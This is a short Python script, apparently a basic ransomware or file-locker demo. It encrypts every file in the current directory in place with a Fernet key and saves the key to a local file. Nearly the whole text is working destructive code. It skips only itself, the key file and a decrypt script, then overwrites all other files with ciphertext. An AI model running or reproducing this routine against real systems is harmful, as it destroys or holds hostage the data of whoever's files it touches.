import os 
from cryptography.fernet import Fernet

#fetch files...
files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "encryption.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
f = Fernet(key)

with open("encryption.key", "wb") as encryptionkey:
    encryptionkey.write(key)
print(key)
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        encrypted_contents = f.encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(encrypted_contents)
